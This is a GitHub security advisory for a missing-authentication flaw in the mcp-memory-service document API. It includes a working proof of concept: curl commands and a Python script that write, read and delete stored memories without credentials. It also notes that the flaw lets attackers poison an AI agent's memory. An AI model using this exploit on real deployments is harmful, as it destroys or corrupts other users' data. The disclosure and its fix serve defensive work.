# [C] mcp-memory-service: Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete

## Summary
Severity: Critical
Advisory: GHSA-84hp-mqvj-3p8h
CVE: CVE-2026-50027
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-84hp-mqvj-3p8h
Type: github-advisory

## Affected
- PyPI: `mcp-memory-service` — affected >=0 <10.67.1

## Details
## Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete

### Summary

All HTTP routes under `/api/documents/*` in `mcp-memory-service` are served without any authentication dependency, even when the server is configured with an API key (`MCP_API_KEY`) or OAuth. An unauthenticated remote attacker can upload arbitrary content into the memory store (write), retrieve stored document content (read), and permanently delete memories belonging to authenticated users (delete) — all without supplying any credentials. The `/api/memories` counterpart correctly enforces authentication, making this an inconsistent and exploitable authentication boundary. CVSS 9.8 Critical.

### Details

The `documents.py` router is instantiated without any router-level `dependencies=` parameter and the file does not import `Depends` at all, so no authentication guard is present on any of its routes:

- **`src/mcp_memory_service/web/api/documents.py:33`** — `from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks` (`Depends` is absent)
- **`src/mcp_memory_service/web/api/documents.py:43`** — `router = APIRouter()` (no `dependencies=` argument)

The affected endpoints and their data-flow sinks are:

| Route | Line (source) | Sink | Line (sink) |
|---|---|---|---|
| `POST /upload` | 149 | `storage.store(memory)` | 449 |
| `POST /batch-upload` | — | `storage.store(memory)` | — |
| `GET /history` | — | upload metadata response | — |
| `GET /search-content/{upload_id}` | 729 | memory content response | 781 |
| `DELETE /remove/{upload_id}` | — | storage deletion | — |
| `DELETE /remove-by-tags` | 687 | `storage.delete_by_tags(tags)` | 705 |

The router is mounted in `src/mcp_memory_service/web/app.py:311`:

```python
app.include_router(documents_router, prefix="/api/documents")
```

No `CORSMiddleware` or authentication middleware applies to these routes at mount time.

By contrast, the equivalent write endpoint in `memories.py` is correctly protected:

```python
# src/mcp_memory_service/web/api/memories.py:136
user: AuthenticationResult = Depends(require_write_access)
```

This demonstrates that the authentication infrastructure exists and is intentionally applied elsewhere, but was omitted from all `documents.py` routes.

### PoC

**Prerequisites**

- Docker installed
- Repository cloned at `repo`

**Build and run the container**

```bash
docker build -t vuln-001-mcp-memory-poc \
  -f vuln-001/Dockerfile \
  repo

docker run -d --name vuln-001-poc-container \
  -p 18000:8000 vuln-001-mcp-memory-poc:latest
```

The container starts `mcp-memory-service` with `MCP_API_KEY=poc-secret-key-12345`, simulating a production deployment where the operator has enabled API-key authentication.

**Execute the PoC**

```bash
python3 vuln-001/poc.py \
  --host 127.0.0.1 --port 18000 --api-key poc-secret-key-12345
```

**Attack chain (6 steps)**

```
[STEP 1] GET /api/memories (no auth) → HTTP 401   ← auth guard is active on memories API
[STEP 2] POST /api/memories (with API key) → HTTP 200   ← legitimate user stores sensitive data
[STEP 3] GET /api/memories (with API key) → HTTP 200  memories_found=1   ← data confirmed
[STEP 4] POST /api/documents/upload (NO auth) → HTTP 200  upload_id=<uuid>   ← WRITE bypass
[STEP 5] DELETE /api/documents/remove-by-tags (NO auth) → HTTP 200  memories_deleted=1   ← DELETE bypass
[STEP 6] GET /api/memories (with API key) → HTTP 200  memories_remaining=0   ← integrity impact confirmed
```

Step 6 proves that an unauthenticated attacker deleted data created by a legitimately authenticated user in a single unauthenticated request.

**Manual curl equivalent**

```bash
# Confirm auth guard is active on /api/memories
curl -i http://127.0.0.1:18000/api/memories
# → 401 Unauthorized

# Write through document API — no credentials
printf 'CVE_AUTH_BYPASS_MARKER' > /tmp/poc.txt
UPLOAD_ID=$(
  curl -s -X POST http://127.0.0.1:18000/api/documents/upload \
    -F "file=@/tmp/poc.txt" -F "tags=cve-poc" |
  python3 -c 'import sys,json; print(json.load(sys.stdin)["upload_id"])'
)
# → 200 OK

sleep 3
curl -s "http://127.0.0.1:18000/api/documents/search-content/$UPLOAD_ID"
# → content returned without authentication

# Delete by tag — no credentials
curl -i -X DELETE "http://127.0.0.1:18000/api/documents/remove-by-tags" \
  -H "Content-Type: application/json" -d '["cve-poc"]'
# → 200 OK, memories_deleted=1
```

**Observed output**

- `GET /api/memories` (no auth) returns `401` — the authentication guard is demonstrably active on the memories API.
- `POST /api/documents/upload` (no auth) returns `200` with a valid `upload_id`.
- `DELETE /api/documents/remove-by-tags` (no auth) returns `200` with `memories_deleted=1`.
- A subsequent authenticated `GET /api/memories` returns `memories_remaining=0`, confirming that legitimately stored data was destroyed by an unauthenticated request.

**Remediation**

Add `Depends(require_write_access)` / `Depends(require_read_access)` to every affected route in `documents.py`:

```diff
--- a/src/mcp_memory_service/web/api/documents.py
+++ b/src/mcp_memory_service/web/api/documents.py
-from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks
+from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks, Depends
 from ..dependencies import get_storage
+from ..oauth.middleware import require_read_access, require_write_access, AuthenticationResult

 async def upload_document(
     background_tasks: BackgroundTasks,
     file: UploadFile = File(...),
+    user: AuthenticationResult = Depends(require_write_access),

 async def batch_upload_documents(
     background_tasks: BackgroundTasks,
     files: List[UploadFile] = File(...),
+    user: AuthenticationResult = Depends(require_write_access),

-async def get_upload_status(upload_id: str):
+async def get_upload_status(upload_id: str, user: AuthenticationResult = Depends(require_read_access)):

-async def get_upload_history():
+async def get_upload_history(user: AuthenticationResult = Depends(require_read_access)):

-async def remove_document(upload_id: str, remove_from_memory: bool = True):
+async def remove_document(upload_id: str, remove_from_memory: bool = True,
+    user: AuthenticationResult = Depends(require_write_access)):

-async def remove_documents_by_tags(tags: List[str]):
+async def remove_documents_by_tags(tags: List[str],
+    user: AuthenticationResult = Depends(require_write_access)):

-async def search_document_content(upload_id: str, limit: int = 1000):
+async def search_document_content(upload_id: str, limit: int = 1000,
+    user: AuthenticationResult = Depends(require_read_access)):
```

### Impact

This is a **Missing Authentication for Critical Function (CWE-306)** vulnerability affecting the HTTP REST server component of `mcp-memory-service`.

**Who is impacted:** Any operator who deploys the HTTP REST server (`memory server --http`) with `MCP_API_KEY` or OAuth enabled, expecting that only authenticated clients can access stored memories. The HTTP server is documented as a supported production feature for team/multi-client deployments.

**Confidentiality:** An unauthenticated attacker can read recently uploaded document content via `GET /api/documents/search-content/{upload_id}` and enumerate upload history via `GET /api/documents/history`. Stored memories may contain sensitive context such as personal notes, AI agent working state, or proprietary data.

**Integrity:** An unauthenticated attacker can inject arbitrary content into the memory store by uploading documents, polluting the AI agent's knowledge base with attacker-controlled data (memory poisoning / prompt injection surface).

**Availability:** An unauthenticated attacker can delete all memories matching any chosen tags via `DELETE /api/documents/remove-by-tags`, or delete individual documents via `DELETE /api/documents/remove/{upload_id}`, causing permanent loss of stored data.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
ENV HF_HOME=/root/.cache/huggingface

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
 build-essential \
 && rm -rf /var/lib/apt/lists/*

# Install CPU-only torch first to avoid pulling the large CUDA wheel from PyPI
RUN pip install --no-cache-dir \
 "torch>=2.0.0" \
 --index-url https://download.pytorch.org/whl/cpu

# Copy and install the mcp-memory-service from the local repo
COPY . /app
RUN pip install --no-cache-dir -e .

# Pre-download the sentence-transformers embedding model so the container
# can run fully offline and starts quickly
RUN python -c "from sentence_transformers import SentenceTransformer; m = SentenceTransformer('all-MiniLM-L6-v2'); v = m.encode(['preflight']); print('Embedding model ready, dim=' + str(len(v[0])))"

# ── Runtime config ──────────────────────────────────────────────────────────
# MCP_API_KEY is set to simulate a production deployment where the operator
# has enabled API-key authentication. The bug is that /api/documents/* routes
# ignore this key entirely.
ENV MCP_API_KEY=poc-secret-key-12345
ENV MCP_MEMORY_STORAGE_BACKEND=sqlite_vec
ENV MCP_HTTP_PORT=8000
ENV MCP_HTTP_HOST=0.0.0.0
ENV MCP_MDNS_ENABLED=false
ENV MCP_CONSOLIDATION_ENABLED=false
ENV MCP_BACKUP_ENABLED=false
ENV MCP_QUALITY_SYSTEM_ENABLED=false
# Prevent any outbound HuggingFace requests at runtime
ENV TRANSFORMERS_OFFLINE=1
ENV HF_DATASETS_OFFLINE=1

EXPOSE 8000

CMD ["python", "run_server.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC – VULN-001: Missing Authentication on Document API Endpoints
CWE-306 Missing Authentication for Critical Function
CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

Attack chain:
 1. GET /api/memories (no auth) → 401 (auth guard confirmed active)
 2. POST /api/memories (with API key) → 200 (legitimate write)
 3. GET /api/memories (with API key) → 200 (data exists)
 4. POST /api/documents/upload (NO auth!) → 200 (write bypass)
 5. DELETE /api/documents/remove-by-tags (NO auth!) → 200 (delete bypass)
 6. GET /api/memories (with API key) → memory is GONE

Step 6 proves an unauthenticated attacker destroyed data created by a
legitimate, authenticated user — confirming full integrity impact.

Usage:
 python3 poc.py [--host 127.0.0.1] [--port 8000] [--api-key poc-secret-key-12345]
"""

import sys
import time
import json
import uuid
import argparse
import http.client

MARKER = "VULN001_AUTH_BYPASS_" + uuid.uuid4().hex[:12].upper()
TARGET_TAG = f"vuln001-target-{uuid.uuid4().hex[:6]}"


# ─── low-level helpers ───────────────────────────────────────────────────────

def http_req(host, port, method, path, body=None, headers=None, timeout=20):
 conn = http.client.HTTPConnection(host, port, timeout=timeout)
 h = dict(headers or {})
 conn.request(method, path, body=body, headers=h)
 resp = conn.getresponse()
 return resp.status, resp.read().decode("utf-8", errors="replace")


def wait_ready(host, port, timeout=120):
 print(f"[*] Waiting for server at {host}:{port} …", flush=True)
 deadline = time.time() + timeout
 while time.time() < deadline:
 try:
 s, _ = http_req(host, port, "GET", "/api/health", timeout=2)
 if s == 200:
 print("[+] Server ready\n", flush=True)
 return True
 except Exception:
 pass
 time.sleep(1)
 return False


def build_multipart(boundary, filename, file_bytes, tags_str):
 b = boundary.encode()
 return b"".join([
 b"--" + b + b"\r\n",
 b'Content-Disposition: form-data; name="file"; filename="' + filename.encode() + b'"\r\n',
 b"Content-Type: /plain\r\n\r\n",
 file_bytes,
 b"\r\n--" + b + b"\r\n",
 b'Content-Disposition: form-data; name="tags"\r\n\r\n',
 tags_str.encode(),
 b"\r\n--" + b + b"--\r\n",
 ])


# ─── individual test steps ───────────────────────────────────────────────────

def step_memories_no_auth(host, port):
 """GET /api/memories without auth must return 401."""
 print("[STEP 1] GET /api/memories (no auth — expect 401)", flush=True)
 status, body = http_req(host, port, "GET", "/api/memories")
 ok = (status == 401)
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status}", flush=True)
 return ok, status


def step_store_memory_with_auth(host, port, api_key):
 """POST /api/memories with API key — store a 'legitimate' memory."""
 print(f"[STEP 2] POST /api/memories (with API key, tag={TARGET_TAG})", flush=True)
 payload = json.dumps({
 "content": f"Sensitive memory — {MARKER}",
 "tags": [TARGET_TAG, "vuln001-demo"],
 "memory_type": "observation",
 "metadata": {"poc": "VULN-001"}
 }).encode()
 headers = {
 "Content-Type": "application/json",
 "Content-Length": str(len(payload)),
 "X-API-Key": api_key,
 }
 status, body = http_req(host, port, "POST", "/api/memories", payload, headers)
 ok = status in (200, 201)
 content_hash = None
 try:
 content_hash = json.loads(body).get("content_hash")
 except Exception:
 pass
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} hash={content_hash}", flush=True)
 if not ok:
 print(f" body: {body[:300]}", flush=True)
 return ok, status, content_hash


def step_verify_memory_exists(host, port, api_key):
 """GET /api/memories with auth — confirm the memory is stored."""
 print("[STEP 3] GET /api/memories (with API key — confirm data exists)", flush=True)
 headers = {"X-API-Key": api_key}
 status, body = http_req(host, port, "GET", f"/api/memories?tags={TARGET_TAG}", headers=headers)
 ok = status == 200
 count = 0
 try:
 data = json.loads(body)
 count = data.get("total", len(data.get("memories", [])))
 except Exception:
 pass
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} memories_found={count}", flush=True)
 return ok, status, count


def step_upload_no_auth(host, port):
 """POST /api/documents/upload without any credentials — should return 200."""
 print("[STEP 4] POST /api/documents/upload (NO auth — expect 200)", flush=True)
 boundary = "PocBoundary" + uuid.uuid4().hex
 payload = f"EVIDENCE: {MARKER}\nUploaded without authentication — VULN-001.\n".encode()
 body = build_multipart(boundary, "poc_vuln001.txt", payload, "poc-evidence,vuln001-demo")
 headers = {
 "Content-Type": f"multipart/form-data; boundary={boundary}",
 "Content-Length": str(len(body)),
 }
 status, resp = http_req(host, port, "POST", "/api/documents/upload", body, headers)
 upload_id = None
 try:
 upload_id = json.loads(resp).get("upload_id")
 except Exception:
 pass
 ok = status == 200 and upload_id is not None
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} upload_id={upload_id}", flush=True)
 if not ok:
 print(f" body: {resp[:300]}", flush=True)
 return ok, status, upload_id


def step_delete_no_auth(host, port):
 """DELETE /api/documents/remove-by-tags without auth — should return 200."""
 print(f"[STEP 5] DELETE /api/documents/remove-by-tags (NO auth, tag={TARGET_TAG})", flush=True)
 # FastAPI 0.100+ treats List[str] in DELETE as request body (JSON array)
 body = json.dumps([TARGET_TAG, "vuln001-demo"]).encode()
 headers = {
 "Content-Type": "application/json",
 "Content-Length": str(len(body)),
 }
 status, resp = http_req(
 host, port, "DELETE", "/api/documents/remove-by-tags",
 body=body, headers=headers
 )
 ok = status == 200
 deleted = 0
 try:
 deleted = json.loads(resp).get("memories_deleted", 0)
 except Exception:
 pass
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} memories_deleted={deleted}", flush=True)
 if not ok:
 print(f" body: {resp[:300]}", flush=True)
 return ok, status, deleted


def step_verify_memory_gone(host, port, api_key):
 """GET /api/memories with auth — confirm attacker wiped the data."""
 print("[STEP 6] GET /api/memories (with API key — verify data was deleted)", flush=True)
 headers = {"X-API-Key": api_key}
 status, body = http_req(host, port, "GET", f"/api/memories?tags={TARGET_TAG}", headers=headers)
 ok = status == 200
 count = 0
 try:
 data = json.loads(body)
 count = data.get("total", len(data.get("memories", [])))
 except Exception:
 pass
 data_deleted = (ok and count == 0)
 print(f" {'PASS' if data_deleted else 'NOTE'} HTTP {status} memories_remaining={count}", flush=True)
 if data_deleted:
 print(" [+] Memory wiped by unauthenticated attacker — integrity impact confirmed!", flush=True)
 return ok, status, count


# ─── main ────────────────────────────────────────────────────────────────────

def main():
 ap = argparse.ArgumentParser(description="VULN-001 PoC — CWE-306 auth bypass")
 ap.add_argument("--host", default="127.0.0.1")
 ap.add_argument("--port", type=int, default=8000)
 ap.add_argument("--api-key", default="poc-secret-key-12345",
 help="API key configured on the server (simulates legitimate user)")
 args = ap.parse_args()

 print("=" * 65)
 print("VULN-001 Missing Authentication on Document API Endpoints")
 print("CWE-306 / CVSS 9.8 (Critical)")
 print("=" * 65 + "\n")

 if not wait_ready(args.host, args.port):
 print("[-] Server did not become ready", flush=True)
 sys.exit(2)

 r = {}

 # Step 1 — baseline: auth IS enforced on /api/memories
 ok1, s1 = step_memories_no_auth(args.host, args.port)
 r["step1_auth_guard_active"] = {
 "pass": ok1,
 "evidence": f"GET /api/memories (no auth) → HTTP {s1}"
 }

 # Step 2 — legitimate user stores a sensitive memory
 ok2, s2, content_hash = step_store_memory_with_auth(args.host, args.port, args.api_key)
 r["step2_legitimate_write"] = {
 "pass": ok2,
 "evidence": f"POST /api/memories (with API key) → HTTP {s2}"
 }

 # Step 3 — confirm memory exists
 ok3, s3, mem_count = step_verify_memory_exists(args.host, args.port, args.api_key)
 r["step3_data_present"] = {
 "pass": ok3 and mem_count > 0,
 "evidence": f"GET /api/memories (with API key) → HTTP {s3}, count={mem_count}"
 }

 # Step 4 — attacker uploads without auth (WRITE bypass)
 ok4, s4, upload_id = step_upload_no_auth(args.host, args.port)
 r["step4_upload_auth_bypass"] = {
 "pass": ok4,
 "evidence": f"POST /api/documents/upload (NO auth) → HTTP {s4}"
 }

 # Step 5 — attacker deletes WITHOUT auth (DELETE bypass)
 ok5, s5, deleted = step_delete_no_auth(args.host, args.port)
 r["step5_delete_auth_bypass"] = {
 "pass": ok5,
 "evidence": f"DELETE /api/documents/remove-by-tags (NO auth) → HTTP {s5}, deleted={deleted}"
 }

 # Step 6 — verify legitimate data is gone
 ok6, s6, remaining = step_verify_memory_gone(args.host, args.port, args.api_key)
 r["step6_integrity_impact"] = {
 "pass": ok6 and remaining == 0,
 "evidence": f"GET /api/memories (with API key) after attack → count={remaining} (was {mem_count})"
 }

 print("\n" + "=" * 65)
 print("RESULTS SUMMARY")
 print("=" * 65)
 for k, v in r.items():
 sym = "PASS" if v["pass"] else "FAIL"
 print(f" [{sym}] {v['evidence']}", flush=True)

 # Core bypass: /api/memories returns 401 BUT /api/documents/* returns 200 without auth
 bypass_proven = ok1 and ok4
 delete_bypass = ok1 and ok5

 print("\nKey evidence:")
 print(f" Auth guard ACTIVE : GET /api/memories (no auth) → HTTP {s1}")
 print(f" Write BYPASS : POST /api/documents/upload (no auth) → HTTP {s4}")
 print(f" Delete BYPASS : DELETE /api/documents/remove-by-tags (no auth) → HTTP {s5}")

 overall = "PASS – auth bypass confirmed" if (bypass_proven or delete_bypass) else "FAIL"
 print(f"\nVerdict: {overall}")
 print("=" * 65)
 sys.exit(0 if (bypass_proven or delete_bypass) else 1)


if __name__ == "__main__":
 main()
```

## References
- https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-84hp-mqvj-3p8h
- https://github.com/doobidoo/mcp-memory-service
